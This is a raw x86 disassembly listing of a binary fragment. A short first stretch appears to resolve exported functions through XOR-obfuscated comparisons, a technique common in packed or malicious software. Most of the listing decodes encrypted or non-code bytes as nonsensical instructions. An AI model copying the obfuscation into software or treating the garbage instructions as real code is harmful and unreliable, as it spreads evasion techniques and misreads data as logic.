  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	pushf  
  40635b:	(bad)  
  40635c:	div    DWORD PTR [eax+edi*1]
  40635f:	cmp    esp,DWORD PTR [edx+0x62]
  406362:	adc    BYTE PTR [edi+0x62],bl
  406365:	bound  esp,QWORD PTR [edx]
  406367:	aad    0x16
  406369:	sti    
  40636a:	cdq    
  40636b:	xchg   BYTE PTR [eax-0x52],cl
  40636e:	sub    eax,0x5160a3d5
  406373:	fisttp WORD PTR ds:0x1808ab4e
  406379:	xor    bh,BYTE PTR [edx+0x7f]
  40637c:	pop    ss
  40637d:	inc    bp
  40637f:	jg     0x406365
  406381:	adc    edx,DWORD PTR [eax-0x3e0d2ea8]
  406387:	push   cs
  406388:	and    DWORD PTR [ecx+0x38f4a50],0x1ccb6a04
  406392:	sub    DWORD PTR [edi-0x48e84486],ebp
  406398:	mov    esi,0xbfe9981b
  40639d:	pop    ds
  40639e:	repnz cmp BYTE PTR [edi+0x5],0x7d
  4063a3:	lods   eax,DWORD PTR ds:[esi]
  4063a4:	cs int 0xa8
  4063a7:	sub    BYTE PTR [eax],cl
  4063a9:	cs (bad) 
  4063ab:	mov    ebx,0x6ae879d2
  4063b0:	fiadd  DWORD PTR [bx+di]
  4063b3:	(bad)  
  4063b4:	sti    
  4063b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063b6:	mov    ss,WORD PTR [ebx]
  4063b8:	push   es
  4063b9:	call   0xac3:0x78718855
  4063c0:	test   al,0x6d
  4063c2:	and    DWORD PTR [esp+eiz*4+0x73],edx
  4063c6:	scas   al,BYTE PTR es:[edi]
  4063c7:	adc    DWORD PTR [ecx+eax*4+0x72],edx
  4063cb:	xchg   DWORD PTR [eax+0x4c],esp
  4063ce:	(bad)  
  4063cf:	repz sub eax,0x4d77ff64
  4063d5:	lds    esp,FWORD PTR [eax+0x41]
  4063d8:	add    eax,0x6a113ed7
  4063dd:	adc    ch,BYTE PTR [esi+0x36]
  4063e0:	mov    ebp,DWORD PTR [esi]
  4063e2:	add    BYTE PTR [eax+esi*4-0x7a8acf63],ch
  4063e9:	imul   edi,eax,0x81722068
  4063ef:	fisubr WORD PTR [edi-0x7f]
  4063f2:	das    
  4063f3:	xor    eax,0x523d20ae
  4063f8:	dec    ebp
  4063f9:	retf   0x74fa
  4063fc:	mov    al,0x35
  4063fe:	test   BYTE PTR [edi],dl
  406400:	sub    esp,DWORD PTR [ebp-0x2f]
  406403:	xchg   DWORD PTR [eax],ebx
  406405:	mov    edx,0x83b3f4e0
  40640a:	shl    BYTE PTR [ecx+0x69],0xd0
  40640e:	jno    0x406475
  406410:	cs jp  0x406467
  406413:	mov    ds:0x26af942a,eax
  406418:	scas   al,BYTE PTR es:[edi]
  406419:	mov    DWORD PTR fs:[edi-0x562835a],edx
  406420:	icebp  
  406421:	not    BYTE PTR [ebp+0x3b5dc229]
  406427:	dec    ebx
  406428:	and    eax,0x9a2cdb
  40642d:	mov    eax,ds:0x5e365958
  406432:	and    DWORD PTR [eax],esp
  406434:	(bad)  
  406435:	jge    0x406422
  406437:	popf   
  406438:	pop    esi
  406439:	test   BYTE PTR [eax-0x40],dh
  40643c:	add    DWORD PTR [edx],ebp
  40643e:	mov    bl,BYTE PTR [esi+ebx*2]
  406441:	in     eax,dx
  406442:	sbb    eax,0xe4a0f4fd
  406447:	mov    ds:0x65d588b1,eax
  40644c:	jle    0x4063d4
  40644e:	cmp    al,0x5b
  406450:	push   edi
  406451:	pushf  
  406452:	aaa    
  406453:	dec    edx
  406454:	fild   QWORD PTR [edx-0x59]
  406457:	fist   WORD PTR ss:[eax]
  40645a:	mov    dl,0x6
  40645c:	and    ebx,DWORD PTR [edx]
  40645e:	dec    ebx
  40645f:	inc    esp
  406460:	adc    al,0xf0
  406462:	mov    ch,0xa
  406464:	cli    
  406465:	outs   dx,DWORD PTR ds:[esi]
  406466:	outs   dx,BYTE PTR ds:[esi]
  406467:	mov    esi,0xe771eef3
  40646c:	ret    
  40646d:	js     0x406490
  40646f:	add    eax,0xe0b538e
  406474:	add    DWORD PTR [esi+0xf],ecx
  406477:	mov    dh,0x1d
  406479:	lea    ecx,[edi+0x68]
  40647c:	retf   0xdcbf
  40647f:	push   edx
  406480:	les    edx,FWORD PTR [edi]
  406482:	or     al,0xd4
  406484:	mov    bh,bl
  406486:	ins    BYTE PTR es:[edi],dx
  406487:	pop    eax
  406488:	std    
  406489:	xchg   esi,eax
  40648a:	adc    eax,0xd290da44
  40648f:	jge    0x4064ad
  406491:	xor    bl,BYTE PTR [eax]
  406493:	push   esp
  406494:	dec    edi
  406495:	fwait
  406496:	and    edi,esp
  406498:	adc    DWORD PTR [ecx],0xdade9312
  40649e:	cdq    
  40649f:	shl    BYTE PTR [ebx+esi*4],1
  4064a2:	mov    bh,0x12
  4064a4:	pop    es
  4064a5:	push   eax
  4064a6:	cmp    eax,0x242baefe
  4064ab:	iret   
  4064ac:	imul   esi,DWORD PTR [ebp+eax*4-0x2b],0xd4da3b32
  4064b4:	dec    esi
  4064b5:	ffreep st(7)
  4064b7:	inc    ecx
  4064b8:	xor    BYTE PTR [esi-0x1f],0xa9
  4064bc:	inc    edi
  4064bd:	push   edi
  4064be:	ins    DWORD PTR es:[edi],dx
  4064bf:	cmp    eax,0x4cb35ed2
  4064c4:	sti    
  4064c5:	out    0xc5,eax
  4064c7:	dec    esp
  4064c8:	jb     0x4064d7
  4064ca:	or     eax,0x417f8ba4
  4064cf:	cmp    DWORD PTR [ebx-0x22],esi
  4064d2:	inc    edi
  4064d3:	adc    eax,0x4ffc7a85
  4064d8:	out    0xc3,eax
  4064da:	mov    es:0xbe71a4dc,eax
  4064e0:	test   BYTE PTR [esi-0x36],dl
  4064e3:	xchg   esi,eax
  4064e4:	sar    BYTE PTR [eax-0xdf3d48a],0x27
  4064eb:	xchg   ebp,eax
  4064ec:	push   0xffffff8b
  4064ee:	test   BYTE PTR [edi-0x27324563],cl
  4064f4:	outs   dx,DWORD PTR ds:[esi]
  4064f5:	lods   al,BYTE PTR ds:[esi]
  4064f6:	sub    dl,BYTE PTR ds:0x30be92f6
  4064fc:	mov    eax,ds:0xcfc8c0ed
  406501:	inc    edx
  406502:	mov    dh,0x86
  406504:	in     al,0x46
  406506:	arpl   WORD PTR [edi-0x48c6869c],bp
  40650c:	inc    esp
  40650d:	sbb    ah,BYTE PTR [ebx+0x2034f10c]
  406513:	inc    eax
  406514:	bound  edx,QWORD PTR [ebp+0x2a8cb74b]
  40651a:	mov    eax,0x84dae0ca
  40651f:	push   es
  406520:	je     0x4064c8
  406522:	fst    DWORD PTR [eax+ebx*1]
  406525:	jecxz  0x406521
  406527:	test   eax,0xdd2bb474
  40652c:	fld    DWORD PTR [esi-0x7b708a31]
  406532:	loope  0x406591
  406534:	or     cl,BYTE PTR ds:0x3c6a51c6
  40653a:	ss cld 
  40653c:	mov    eax,0x927eadef
  406541:	adc    ebx,DWORD PTR [eax-0x6ab07ae2]
  406547:	daa    
  406548:	xchg   edx,eax
  406549:	addr16 jmp 0xc5ea16b
  40654f:	(bad)  
  406550:	adc    ebp,DWORD PTR [ecx-0x781c2e8e]
  406556:	pop    ecx
  406557:	xor    BYTE PTR [ebx+ecx*8-0x9],0x3
  40655c:	push   es
  40655d:	jl     0x4064ee
  40655f:	outs   dx,BYTE PTR ds:[esi]
  406560:	xor    DWORD PTR [ecx-0x64],0xffffffbd
  406564:	dec    ebx
  406565:	es test eax,0x70154f29
  40656b:	repnz inc ecx
  40656d:	add    bl,BYTE PTR [ecx]
  40656f:	sbb    BYTE PTR [eax],bl
  406571:	bound  edi,QWORD PTR [eax-0x20b160a3]
  406577:	popa   
  406578:	xlat   BYTE PTR ds:[ebx]
  406579:	pop    esp
  40657a:	hlt    
  40657b:	mov    cl,0x5d
  40657d:	and    al,cl
  40657f:	jnp    0x4065dc
  406581:	addr16 dec ecx
  406583:	cmp    al,0xd3
  406585:	je     0x406509
  406587:	pop    es
  406588:	jmp    FWORD PTR [ebx-0x29a12c8a]
  40658e:	cdq    
  40658f:	jnp    0x406606
  406591:	arpl   sp,bp
  406593:	sbb    DWORD PTR [ecx*2-0x6e125eed],ebx
  40659a:	call   0x7751:0xd471e21c
  4065a1:	xchg   ebx,eax
  4065a2:	pushf  
  4065a3:	scas   eax,DWORD PTR es:[edi]
  4065a4:	or     eax,0xea134415
  4065a9:	je     0x40658a
  4065ab:	mov    eax,0xc90edf3e
  4065b0:	or     dl,BYTE PTR [edx]
  4065b2:	xchg   ebx,eax
  4065b3:	pop    ebx
  4065b4:	test   eax,edi
  4065b6:	fist   DWORD PTR [eax-0x60]
  4065b9:	stc    
  4065ba:	or     BYTE PTR [ebx],0x31
  4065bd:	mov    ebp,0x1d0ae2
  4065c2:	or     BYTE PTR [edi+ebp*8],bh
  4065c5:	mov    WORD PTR [ecx],fs
  4065c7:	mov    esp,0x633b1d42
  4065cc:	repnz loop 0x4065d5
  4065cf:	jecxz  0x406578
  4065d1:	idiv   BYTE PTR [ecx+0x135301c4]
  4065d7:	in     eax,dx
  4065d8:	dec    edi
  4065d9:	cmp    eax,0x5528eee8
  4065de:	and    BYTE PTR [ebp-0x22],dl
  4065e1:	les    eax,FWORD PTR [esp+edx*4]
  4065e4:	out    dx,al
  4065e5:	mov    al,ds:0x4255df41
  4065ea:	xor    dl,dl
  4065ec:	dec    esp
  4065ed:	cmp    DWORD PTR [edi+0x770d7c93],esp
  4065f3:	xlat   BYTE PTR ds:[ebx]
  4065f4:	fst    QWORD PTR [edx]
  4065f6:	and    al,0x6b
  4065f8:	lea    ecx,[ebx+0x14]
  4065fb:	inc    esp
  4065fc:	in     al,dx
  4065fd:	push   ebp
  4065fe:	outs   dx,DWORD PTR ds:[esi]
  4065ff:	mov    eax,0x79aa6b83
  406604:	lea    ecx,[esi-0x40]
  406607:	inc    esp
  406608:	(bad)  
  406609:	das    
  40660a:	out    0xc6,eax
  40660c:	lea    ebx,ss:[esi]
  40660f:	push   esp
  406610:	xchg   ecx,eax
  406611:	xchg   esp,eax
  406612:	jecxz  0x4065f2
  406614:	ss in  eax,0x55
  406617:	mov    ah,0x8b
  406619:	nop
  40661a:	jge    0x406669
  40661c:	inc    eax
  40661d:	bnd jl 0x406602
  406620:	xchg   esi,eax
  406621:	jbe    0x406604
  406623:	mov    esi,0x446d7f09
  406628:	push   0x864004f4
  40662d:	add    eax,0xb066c50b
  406632:	out    dx,al
  406633:	ds xor eax,0xe4f02e3f
  406639:	in     eax,dx
  40663a:	std    
  40663b:	add    dl,bh
  40663d:	mov    ds:0xb6e23bac,al
  406642:	jecxz  0x4065e8
  406644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406645:	ins    DWORD PTR es:[edi],dx
  406646:	enter  0x87c8,0x72
  40664a:	std    
  40664b:	xor    al,0x4f
  40664d:	test   eax,0xbc34b895
  406652:	inc    ebp
  406653:	out    0x1,eax
  406655:	retf   0x7260
  406658:	sub    BYTE PTR [esi+0x19],al
  40665b:	and    eax,0x8cd3afa1
  406660:	or     eax,DWORD PTR [ebp-0x4c]
  406663:	ds stos DWORD PTR es:[edi],eax
  406665:	dec    ebp
  406666:	nop
  406667:	mov    bh,0x2
  406669:	sldt   WORD PTR [edi+0x32]
  40666d:	or     BYTE PTR [edi],bh
  40666f:	leave  
  406670:	mov    esi,0x529cf67d
  406675:	push   ebx
  406676:	in     al,0x56
  406678:	fs mov dh,0x84
  40667b:	std    
  40667c:	jmp    0x83da:0x517c1b0d
  406683:	mov    bl,0x79
  406685:	(bad)  [edi]
  406687:	jg     0x40669e
  406689:	cmp    BYTE PTR [eax-0x41b81c6f],ah
  40668f:	and    bl,cl
  406691:	mov    ecx,0x306cfabd
  406696:	lahf   
  406697:	push   0xae869a4e
  40669c:	sbb    BYTE PTR [ecx],al
  40669e:	and    eax,0xf37fa22b
  4066a3:	mov    dl,0x7
  4066a5:	and    eax,0x4ecf5f16
  4066aa:	in     al,dx
  4066ab:	xchg   ebx,eax
  4066ac:	pop    edx
  4066ad:	or     al,ah
  4066af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b0:	sti    
  4066b1:	mov    ecx,0xe7fca97b
  4066b6:	(bad)  
  4066b7:	xchg   esi,eax
  4066b8:	ss pop ecx
  4066ba:	stc    
  4066bb:	les    esp,FWORD PTR [esi-0x4eb1670e]
  4066c1:	imul   sp,WORD PTR [ebx],0x30d4
  4066c6:	imul   esp,DWORD PTR [ebp-0x59],0x6a030da3
  4066cd:	(bad)  
  4066ce:	xchg   ecx,eax
  4066cf:	cld    
  4066d0:	test   BYTE PTR [ebp-0x7],bh
  4066d3:	pop    ebx
  4066d4:	hlt    
  4066d5:	mov    ds:0xa3e84bf3,eax
  4066da:	neg    BYTE PTR [ecx]
  4066dc:	test   BYTE PTR [ecx],dl
  4066de:	mov    ah,0xa8
  4066e0:	cmp    DWORD PTR [eax+0x242cdb36],ebp
  4066e6:	pop    edi
  4066e7:	sar    BYTE PTR [esi+ebp*4+0x18bf620d],0xc3
  4066ef:	xor    edi,ebx
  4066f1:	loopne 0x4066e6
  4066f3:	stos   BYTE PTR es:[edi],al
  4066f4:	leave  
  4066f5:	lods   al,BYTE PTR ds:[esi]
  4066f6:	jmp    0x958421c2
  4066fb:	int3   
  4066fc:	push   ebp
  4066fd:	sub    cl,cl
  4066ff:	xor    BYTE PTR [edi+0x45cae1d3],dl
  406705:	mov    esi,0xcad5d122
  40670a:	push   ebx
  40670b:	jmp    0x78d8f05b
  406710:	mov    cl,BYTE PTR [ecx-0x7b4d448]
  406716:	out    0xf4,eax
  406718:	loope  0x406743
  40671a:	xlat   BYTE PTR ds:[ebx]
  40671b:	lahf   
  40671c:	mov    al,0x99
  40671e:	jns    0x406737
  406720:	cmp    ch,BYTE PTR [ebx+0x24db2300]
  406726:	aad    0xbc
  406728:	jns    0x4066e5
  40672a:	enter  0x90d4,0x3c
  40672e:	jl     0x4066f9
  406730:	aad    0x7f
  406732:	aad    0xa
  406734:	pusha  
  406735:	icebp  
  406736:	and    ah,al
  406738:	mov    al,ds:0x27ce0538
  40673d:	repnz mov ecx,0x690b3644
  406743:	cmp    dl,BYTE PTR [eax+edi*4]
  406746:	into   
  406747:	pusha  
  406748:	or     eax,0xc8ea5298
  40674d:	sahf   
  40674e:	xchg   edx,eax
  40674f:	dec    edx
  406750:	fnstenv [edx+eax*2]
  406753:	mov    cl,0xb0
  406755:	push   esp
  406756:	sbb    eax,0xb39d27c6
  40675b:	xchg   ebx,eax
  40675c:	and    DWORD PTR [ecx+eiz*8],edx
  40675f:	ins    BYTE PTR es:[edi],dx
  406760:	test   DWORD PTR [eax],eax
  406762:	xchg   edi,eax
  406763:	pop    esp
  406764:	pop    eax
  406765:	lock sub eax,0x4b48bc97
  40676b:	int3   
  40676c:	in     al,0xd3
  40676e:	push   es
  40676f:	call   0x1ab467d0
  406774:	or     ecx,DWORD PTR es:[ebp+0x1b]
  406778:	mov    ebp,DWORD PTR [ecx]
  40677a:	mov    al,ds:0x9f9846b4
  40677f:	jnp    0x4067a6
  406781:	mov    esi,0x7975ddb0
  406786:	xchg   edx,eax
  406787:	adc    DWORD PTR [edi-0x5e],0x970a3133
  40678e:	retf   0xb0b2
  406791:	js     0x40677a
  406793:	push   ss
  406794:	leave  
  406795:	mov    bh,ah
  406797:	call   0x6b3f369b
  40679c:	and    DWORD PTR [edi-0x6d070e37],0x4f
  4067a3:	int3   
  4067a4:	bound  eax,QWORD PTR cs:[eax+0x13a47845]
  4067ab:	iret   
  4067ac:	push   esp
  4067ad:	push   ebx
  4067ae:	leave  
  4067af:	jmp    0xd6391542
  4067b4:	(bad)  
  4067b6:	(bad)  
  4067b7:	jmp    0x409fb2e3
  4067bc:	fwait
  4067bd:	test   DWORD PTR [eax+eax*4-0x29],edi
  4067c1:	les    eax,FWORD PTR [edx]
  4067c3:	jmp    0x2479:0xd7aee835
  4067ca:	ror    DWORD PTR [ecx],1
  4067cc:	fidiv  DWORD PTR [edi]
  4067ce:	lods   eax,DWORD PTR ds:[esi]
  4067cf:	iret   
  4067d0:	pop    esp
  4067d1:	mov    BYTE PTR [ebp-0x35],ah
  4067d4:	inc    esp
  4067d5:	fadd   DWORD PTR [edi]
  4067d7:	imul   edx,DWORD PTR [ebp+edx*1-0x16],0xffffff8d
  4067dc:	(bad)  
  4067dd:	mov    al,ds:0xcc0fef98
  4067e2:	jl     0x4067f6
  4067e4:	dec    esi
  4067e5:	scas   al,BYTE PTR es:[edi]
  4067e6:	scas   al,BYTE PTR es:[edi]
  4067e7:	out    0x37,al
  4067e9:	jl     0x4067e4
  4067eb:	fwait
  4067ec:	iret   
  4067ed:	xchg   DWORD PTR [esi-0x3a9935cc],edx
  4067f3:	fwait
  4067f4:	dec    ecx
  4067f5:	mov    DWORD PTR [eax+0xa],edx
  4067f8:	or     ebx,DWORD PTR [eax+0x56]
  4067fb:	out    0x66,al
  4067fd:	loope  0x406842
  4067ff:	pop    edx
  406800:	ds sub eax,0x50a37c9c
  406806:	hlt    
  406807:	or     DWORD PTR [edi+0x47],edx
  40680a:	pop    edi
  40680b:	sub    edx,DWORD PTR ds:0xc9f9be4a
  406811:	sub    bh,BYTE PTR [edi+0x1]
  406814:	or     dl,BYTE PTR [ecx]
  406816:	jbe    0x406802
  406818:	sub    DWORD PTR es:[ebx],edx
  40681b:	push   ss
  40681c:	xor    ebx,DWORD PTR [edx-0x73610067]
  406822:	mov    WORD PTR [ebp+edi*8-0x4aa28996],es
  406829:	test   al,0x77
  40682b:	imul   ebx,DWORD PTR [ecx-0x22],0x12b6c3da
  406832:	adc    edx,esi
  406834:	dec    ebx
  406835:	xchg   ecx,eax
  406836:	xchg   BYTE PTR [esi],al
  406838:	int    0x26
  40683a:	lahf   
  40683b:	out    0x14,al
  40683d:	(bad)  
  40683e:	(bad)  
  40683f:	stos   BYTE PTR es:[edi],al
  406840:	jne    0x4067c3
  406842:	jle    0x4067f8
  406844:	jns    0x4068ae
  406846:	into   
  406847:	pop    eax
  406848:	xchg   edi,eax
  406849:	fstp   QWORD PTR [ebp+0x5e]
  40684c:	ins    BYTE PTR es:[edi],dx
  40684d:	mov    al,0x89
  40684f:	ja     0x406824
  406851:	jg     0x4067e5
  406853:	pop    esi
  406854:	dec    ecx
  406855:	call   0xe31a9f74
  40685a:	mov    bl,0xab
  40685c:	scas   al,BYTE PTR es:[edi]
  40685d:	enter  0x98cc,0xac
  406861:	repnz dec ecx
  406863:	mov    esi,edx
  406865:	dec    eax
  406866:	pop    ebp
  406867:	cmp    DWORD PTR [ebp+eax*1+0x7],ecx
  40686b:	mov    ebx,0xfb5262db
  406870:	jle    0x40689e
  406872:	pop    ebx
  406873:	out    dx,al
  406874:	sbb    eax,0x5155b257
  406879:	nop
  40687a:	mov    ebx,0xf5a0e084
  40687f:	mov    esp,DWORD PTR [ebx+0x48b18cae]
  406885:	(bad)  
  406886:	sub    DWORD PTR fs:[eax-0x60],ebp
  40688a:	mov    edi,0xf435c02d
  40688f:	sbb    BYTE PTR [eax+0x71],cl
  406892:	xor    ebp,DWORD PTR [edi]
  406894:	into   
  406895:	jae    0x4068ec
  406897:	out    dx,eax
  406898:	adc    ah,BYTE PTR [edx+ecx*2]
  40689b:	xor    eax,0x6fdb4495
  4068a0:	dec    edi
  4068a1:	shl    BYTE PTR [esp+edx*2-0x5c],1
  4068a5:	lods   al,BYTE PTR ds:[esi]
  4068a6:	outs   dx,BYTE PTR ds:[esi]
  4068a7:	inc    eax
  4068a8:	lea    eax,[esi+0x4c19e189]
  4068ae:	ror    BYTE PTR ds:0x47a4f2d6,1
  4068b4:	inc    edx
  4068b5:	fld    TBYTE PTR [ebp-0x51d01d11]
  4068bb:	lods   eax,DWORD PTR ds:[esi]
  4068bc:	lahf   
  4068bd:	loop   0x4068b1
  4068bf:	popa   
  4068c0:	and    DWORD PTR [ecx],esp
  4068c2:	dec    edi
  4068c3:	add    BYTE PTR [esi+0x30],dl
  4068c6:	push   eax
  4068c7:	shl    BYTE PTR ds:0x29f3e369,1
  4068cd:	ret    
  4068ce:	mov    ds:0x97189f99,al
  4068d3:	or     esi,DWORD PTR [edi+0x7b]
  4068d6:	ja     0x4068f0
  4068d8:	inc    eax
  4068d9:	hlt    
  4068da:	and    al,ch
  4068dc:	and    al,0xc6
  4068de:	adc    ch,ch
  4068e0:	push   es
  4068e1:	lea    ecx,[ecx+0x48]
  4068e4:	mov    edi,0x3e938159
  4068e9:	out    dx,eax
  4068ea:	test   DWORD PTR [ebx],0xb9087e36
  4068f0:	repz (bad) 
  4068f2:	mov    eax,0xaa80069c
  4068f7:	or     al,ch
  4068f9:	stc    
  4068fa:	and    al,0xa4
  4068fc:	push   ds
  4068fd:	fsubr  DWORD PTR [esi-0x25057f41]
  406903:	sbb    al,0xfa
  406905:	cs mov bh,ch
  406908:	retf   
  406909:	xchg   DWORD PTR [ebx+ebx*8+0x22],ebp
  40690d:	sub    BYTE PTR [ecx],bh
  40690f:	dec    esi
  406910:	xchg   esp,eax
  406911:	sbb    DWORD PTR [edi+0x275e2660],edx
  406917:	jmp    0x4068e1
  406919:	rol    BYTE PTR [ecx],0xdb
  40691c:	scas   al,BYTE PTR es:[edi]
  40691d:	cmp    al,BYTE PTR [esi-0x3f]
  406920:	jmp    0xd88d:0x843eafa6
  406927:	add    bh,dh
  406929:	jl     0x406921
  40692b:	mov    ebx,0xc81f9f57
  406930:	outs   dx,DWORD PTR ds:[esi]
  406931:	fwait
  406932:	dec    esi
  406933:	out    0x3f,eax
  406935:	cdq    
  406936:	jb     0x4069b5
  406938:	and    esi,DWORD PTR [eax]
  40693a:	push   edi
  40693b:	fld    DWORD PTR [ebp-0x65688010]
  406941:	sbb    al,0xda
  406943:	stos   DWORD PTR es:[edi],eax
  406944:	popa   
  406945:	dec    esp
  406946:	stc    
  406947:	icebp  
  406948:	mov    ds,WORD PTR [ecx+0x32]
  40694b:	enter  0x803b,0x1e
  40694f:	cmp    eax,0xcecdb94a
  406954:	(bad)  
  406956:	js     0x406993
  406958:	push   0x39
  40695a:	arpl   WORD PTR [ecx+ebp*8+0x3f],si
  40695e:	mov    al,0x1b
  406960:	jmp    0xd4fd:0x296b0b44
  406967:	loop   0x40695b
  406969:	pushf  
  40696a:	outs   dx,DWORD PTR ds:[esi]
  40696b:	loope  0x40695f
  40696d:	cmc    
  40696e:	out    dx,eax
  40696f:	push   eax
  406970:	mov    ebx,DWORD PTR [edi+0x2d]
  406973:	sbb    al,0xc
  406975:	das    
  406976:	and    eax,0x5380b727
  40697b:	sub    ebx,DWORD PTR [edx+ebp*1+0x6f]
  40697f:	xchg   esp,eax
  406980:	sbb    eax,0x654bc80f
  406985:	je     0x40696a
  406987:	xchg   edi,eax
  406988:	popf   
  406989:	push   ecx
  40698a:	or     BYTE PTR [ecx],bl
  40698c:	or     eax,0xb4defc
  406991:	mov    cl,bh
  406993:	pop    es
  406994:	cmp    eax,DWORD PTR [ecx-0x4c8183bf]
  40699a:	ins    BYTE PTR es:[edi],dx
  40699b:	aaa    
  40699c:	int    0x86
  40699e:	lock lods eax,DWORD PTR ds:[esi]
  4069a0:	xchg   esi,eax
  4069a1:	mov    BYTE PTR [edi+esi*4+0x6acdeb02],bh
  4069a8:	shr    ecx,1
  4069aa:	stos   BYTE PTR es:[edi],al
  4069ab:	adc    al,0x31
  4069ad:	std    
  4069ae:	xor    eax,0x34cb9ee3
  4069b3:	cld    
  4069b4:	repz xor BYTE PTR [ecx],cl
  4069b7:	push   ss
  4069b8:	xchg   edi,eax
  4069b9:	jne    0x406a09
  4069bb:	xchg   BYTE PTR [esp+esi*8-0x45],dh
  4069bf:	dec    ebp
  4069c0:	mov    esi,0x567fd7cd
  4069c5:	sub    eax,ebp
  4069c7:	mov    eax,ds:0x5fd39691
  4069cc:	jl     0x406a00
  4069ce:	xor    cl,BYTE PTR [edi]
  4069d0:	mov    gs,WORD PTR [esi]
  4069d2:	call   0xde8e8b1c
  4069d7:	call   0x91220473
  4069dc:	push   0x8
  4069de:	outs   dx,BYTE PTR ds:[esi]
  4069df:	imul   ebx,ebp,0xffffffbb
  4069e2:	dec    ebx
  4069e3:	aaa    
  4069e4:	xchg   esi,eax
  4069e5:	inc    ecx
  4069e6:	pop    esi
  4069e7:	sbb    al,BYTE PTR [ecx]
  4069e9:	mov    edi,0x472afa
  4069ee:	xor    DWORD PTR [edx+edx*4+0x4b5bc862],esi
  4069f5:	push   ss
  4069f6:	dec    edi
  4069f7:	lea    ebp,[edi-0xc]
  4069fa:	js     0x406a5c
  4069fc:	mov    dl,0x3a
  4069fe:	xlat   BYTE PTR ds:[ebx]
  4069ff:	xchg   ebx,eax
  406a00:	dec    ebx
  406a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a02:	sbb    edi,DWORD PTR [ecx]
  406a04:	add    eax,0x55e4e1fd
  406a09:	sub    eax,0x1ef4a3e
  406a0e:	and    DWORD PTR [edx-0x6adc25d],ebx
  406a14:	mov    esp,0xb1caf867
  406a19:	call   0x5825f125
  406a1e:	fs pop esi
  406a20:	xchg   esi,eax
  406a21:	inc    esp
  406a22:	pop    esp
  406a23:	sar    BYTE PTR [edx-0x2ff47b69],1
  406a29:	mov    ss,WORD PTR [edi]
  406a2b:	lods   al,BYTE PTR ds:[esi]
  406a2c:	retf   
  406a2d:	cdq    
  406a2e:	ret    
  406a2f:	iret   
  406a30:	fwait
  406a31:	push   ss
  406a32:	scas   eax,DWORD PTR es:[edi]
  406a33:	icebp  
  406a34:	aas    
  406a35:	shr    BYTE PTR [eax-0x314b9298],1
  406a3b:	cmc    
  406a3c:	test   eax,0xd2d04152
  406a41:	hlt    
  406a42:	mul    DWORD PTR [ebx-0xd207262]
  406a48:	stos   DWORD PTR es:[edi],eax
  406a49:	imul   esi,DWORD PTR [ebx+edx*8-0x75],0x13f236cc
  406a51:	fdiv   QWORD PTR [edx+eax*2+0x5de946cb]
  406a58:	imul   edi,DWORD PTR [edx],0xbec37fc5
  406a5e:	xchg   esi,eax
  406a5f:	xchg   ebx,eax
  406a60:	lea    ebx,[edi-0x3fd813b8]
  406a66:	inc    esp
  406a67:	mov    esp,0x794caf4a
  406a6c:	push   edx
  406a6d:	cmp    bl,cl
  406a6f:	cmp    al,0x90
  406a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a72:	xchg   DWORD PTR [edi+0x136fb367],esi
  406a78:	xor    BYTE PTR [edi+edi*2],al
  406a7b:	xor    dh,BYTE PTR [esi]
  406a7d:	push   ebp
  406a7e:	ret    
  406a7f:	sahf   
  406a80:	xor    eax,0x6bf926ab
  406a85:	xchg   ebp,eax
  406a86:	clc    
  406a87:	xchg   esi,eax
  406a88:	mul    esi
  406a8a:	mov    ds:0xdda0613a,eax
  406a8f:	ins    DWORD PTR es:[edi],dx
  406a90:	test   edi,0x51f6c05
  406a96:	xchg   edi,eax
  406a97:	jp     0x406a96
  406a99:	pusha  
